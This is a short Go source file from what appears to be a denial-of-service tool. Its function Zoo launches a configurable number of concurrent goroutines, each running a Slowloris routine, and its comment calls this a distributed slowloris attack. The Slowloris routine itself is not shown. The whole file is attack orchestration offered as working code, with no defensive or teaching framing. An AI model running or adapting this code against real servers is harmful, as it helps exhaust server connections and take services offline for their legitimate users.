package main

import (
	"context"
	"fmt"
	"sync"
)

// Zoo performs a distributed slowloris attack based on the given parameters
func Zoo(o Options) error {
	var ctx context.Context
	ctx = context.Background()
	if o.Timeout != 0 {
		ctx, _ = context.WithTimeout(ctx, o.Timeout)
	}

	wg := sync.WaitGroup{}
	for i := int64(0); i < o.Count; i++ {
		wg.Add(1)
		go func(index int64) {
			defer wg.Done()
			fmt.Printf("slowloris %d\n", index)
			if err := Slowloris(ctx, index, o); err != nil {
				fmt.Printf("slowloris %d received err: %s\n", index, err)
				return
			}
		}(i)
	}

	wg.Wait()
	return nil
}
